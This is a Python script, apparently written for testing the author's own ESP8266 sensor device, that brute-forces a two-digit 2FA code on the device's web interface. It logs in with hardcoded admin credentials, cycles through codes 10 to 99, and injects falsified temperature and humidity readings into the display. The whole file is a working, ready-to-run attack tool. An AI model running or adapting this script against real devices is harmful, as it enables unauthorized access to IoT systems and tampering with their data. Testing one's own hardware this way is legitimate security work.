import requests
from requests.auth import HTTPBasicAuth

# Configuration
TARGET_IP = "http://10.158.58.32"  # Replace with your ESP8266 IP
ADMIN_USER = "admin"
ADMIN_PASS = "1234"

# The values you want to force into the sensor display
NEW_TEMP = "125.0"
NEW_HUMIDITY = "150.0"

def start_brute_force():
    print(f"[*] Starting 2-digit 2FA brute force on {TARGET_IP}...")
    
    # Try every combination from 10 to 99 (based on your random(10, 100) logic)
    for code in range(10, 100):
        params = {
            't': NEW_TEMP,
            'h': NEW_HUMIDITY,
            'code': str(code)
        }
        
        try:
            # Send GET request with Basic Auth
            response = requests.get(
                TARGET_IP, 
                params=params, 
                auth=HTTPBasicAuth(ADMIN_USER, ADMIN_PASS),
                timeout=2
            )
            
            # Check if we were redirected (303) or got a 200 without the "Invalid" message
            if response.status_code == 200 and "Invalid 2FA Code!" not in response.text:
                print(f"[+] Success! Correct Code: {code}")
                return
            else:
                print(f"[-] Code {code} failed.")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
            break

    print("[!] Brute force complete. No code found or device reset.")

if __name__ == "__main__":
    start_brute_force()